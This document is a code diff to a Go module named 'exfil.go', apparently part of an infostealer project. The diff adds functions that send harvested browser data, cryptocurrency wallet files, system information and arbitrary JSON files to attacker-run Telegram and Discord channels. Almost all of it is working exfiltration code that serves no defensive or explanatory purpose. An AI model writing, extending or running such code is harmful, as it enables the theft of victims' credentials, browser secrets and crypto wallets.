@@ -1,5 +1,5 @@
 // ============================================================
-// exfil.go - Data Exfiltration Module (FULLY UPDATED)
+// exfil.go - Data Exfiltration Module (COMPLETE)
 // ============================================================
 package exfil
 
@@ -13,6 +13,8 @@ import (
 	"os"
 	"path/filepath"
 	"time"
+
+	"github.com/RU7HL355/redtm/internal/core/browsers"
 )
 
 var (
@@ -49,6 +51,10 @@ func Init(token, chat, discord string) {
 func IsInitialized() bool {
 	return initialized && botToken != "" && chatID != ""
 }
+
+// ============================================================
+// TELEGRAM FUNCTIONS
+// ============================================================
 
 // SendTelegram sends a message via Telegram
 func SendTelegram(message string) bool {
@@ -116,6 +122,37 @@ func SendTelegram(message string) bool {
 	return true
 }
 
+// SendTelegramFile sends a file via Telegram
+func SendTelegramFile(filePath, caption string) bool {
+	if botToken == "" || chatID == "" {
+		log.Println("⚠️ Telegram not configured")
+		return false
+	}
+
+	fileData, err := ioutil.ReadFile(filePath)
+	if err != nil {
+		log.Printf("❌ Failed to read file: %v", err)
+		return false
+	}
+
+	log.Printf("📁 Sending file: %s (%d bytes)", filePath, len(fileData))
+
+	// For simplicity, send as base64 encoded message
+	message := fmt.Sprintf("📁 File: %s\nSize: %d bytes\n%s",
+		filePath, len(fileData), string(fileData))
+
+	if len(message) > 4000 {
+		message = fmt.Sprintf("📁 File: %s\nSize: %d bytes\n(truncated)",
+			filePath, len(fileData))
+	}
+
+	return SendTelegram(message)
+}
+
+// ============================================================
+// DISCORD FUNCTIONS
+// ============================================================
+
 // SendDiscord sends a message via Discord
 func SendDiscord(message string) bool {
 	log.Println("📤 SendDiscord called")
@@ -169,32 +206,9 @@ func SendDiscord(message string) bool {
 	return true
 }
 
-// SendFile sends a file via Telegram
-func SendFile(filePath, caption string) bool {
-	if botToken == "" || chatID == "" {
-		log.Println("⚠️ Telegram not configured")
-		return false
-	}
-
-	fileData, err := ioutil.ReadFile(filePath)
-	if err != nil {
-		log.Printf("❌ Failed to read file: %v", err)
-		return false
-	}
-
-	log.Printf("📁 Sending file: %s (%d bytes)", filePath, len(fileData))
-
-	// For simplicity, send as base64 encoded message
-	message := fmt.Sprintf("📁 File: %s\nSize: %d bytes\n%s",
-		filePath, len(fileData), string(fileData))
-
-	if len(message) > 4000 {
-		message = fmt.Sprintf("📁 File: %s\nSize: %d bytes\n(truncated)",
-			filePath, len(fileData))
-	}
-
-	return SendTelegram(message)
-}
+// ============================================================
+// HEARTBEAT FUNCTIONS
+// ============================================================
 
 // SendHeartbeat sends a heartbeat message
 func SendHeartbeat(message string) bool {
@@ -208,6 +222,10 @@ func SendHeartbeat(message string) bool {
 
 	return telegramResult || discordResult
 }
+
+// ============================================================
+// DATA COLLECTION AND SENDING
+// ============================================================
 
 // CollectAndSend collects all extracted data and sends it
 func CollectAndSend() {
@@ -270,7 +288,7 @@ func CollectAndSend() {
 					// Send as file
 					SendTelegram(fmt.Sprintf("📁 %s: %d bytes (sent as file)", file, len(data)))
 					SendDiscord(fmt.Sprintf("📁 %s: %d bytes (sent as file)", file, len(data)))
-					SendFile(file, "Extracted data")
+					SendTelegramFile(file, "Extracted data")
 				}
 			}
 
@@ -296,6 +314,94 @@ func CollectAndSend() {
 	log.Printf("✅ Exfil complete (%d files sent)", foundFiles)
 }
 
+// ============================================================
+// BROWSER DATA FUNCTIONS
+// ============================================================
+
+// SendBrowserData sends browser data to Telegram/Discord
+func SendBrowserData() bool {
+	log.Println("📤 Sending browser data...")
+	
+	browserData := browsers.FormatBrowserData()
+	
+	// Send formatted data
+	result1 := SendTelegram(browserData)
+	result2 := SendDiscord(browserData)
+	
+	// Also send JSON file if it exists
+	if _, err := os.Stat("browser_data.json"); err == nil {
+		SendTelegramFile("browser_data.json", "Browser Data JSON")
+	}
+	
+	return result1 || result2
+}
+
+// ============================================================
+// WALLET DATA FUNCTIONS
+// ============================================================
+
+// SendWalletData sends wallet data to Telegram/Discord
+func SendWalletData() bool {
+	log.Println("📤 Sending wallet data...")
+	
+	if _, err := os.Stat("wallets.json"); err != nil {
+		log.Println("⚠️ No wallet data found")
+		return false
+	}
+	
+	data, err := ioutil.ReadFile("wallets.json")
+	if err != nil {
+		log.Printf("❌ Failed to read wallets.json: %v", err)
+		return false
+	}
+	
+	if len(data) < 4000 {
+		message := fmt.Sprintf("💰 WALLET DATA:\n%s", string(data))
+		SendTelegram(message)
+		SendDiscord(message)
+	} else {
+		SendTelegram("💰 Wallet data: " + fmt.Sprintf("%d bytes", len(data)))
+		SendTelegramFile("wallets.json", "Wallet Data")
+	}
+	
+	return true
+}
+
+// ============================================================
+// SYSTEM INFO FUNCTIONS
+// ============================================================
+
+// SendSystemInfo sends system info to Telegram/Discord
+func SendSystemInfo() bool {
+	log.Println("📤 Sending system info...")
+	
+	if _, err := os.Stat("system_info.json"); err != nil {
+		log.Println("⚠️ No system info found")
+		return false
+	}
+	
+	data, err := ioutil.ReadFile("system_info.json")
+	if err != nil {
+		log.Printf("❌ Failed to read system_info.json: %v", err)
+		return false
+	}
+	
+	if len(data) < 4000 {
+		message := fmt.Sprintf("🖥️ SYSTEM INFO:\n%s", string(data))
+		SendTelegram(message)
+		SendDiscord(message)
+	} else {
+		SendTelegram("🖥️ System info: " + fmt.Sprintf("%d bytes", len(data)))
+		SendTelegramFile("system_info.json", "System Info")
+	}
+	
+	return true
+}
+
+// ============================================================
+// UTILITY FUNCTIONS
+// ============================================================
+
 // SendAllFiles sends all JSON files in the current directory
 func SendAllFiles() {
 	log.Println("📤 Sending all JSON files...")
@@ -319,7 +425,7 @@ func SendAllFiles() {
 					SendTelegram(fmt.Sprintf("📁 %s:\n%s", file, string(data)))
 				} else {
 					SendTelegram(fmt.Sprintf("📁 %s: %d bytes", file, len(data)))
-					SendFile(file, "Extracted data")
+					SendTelegramFile(file, "Extracted data")
 				}
 			}
 			time.Sleep(1 * time.Second)
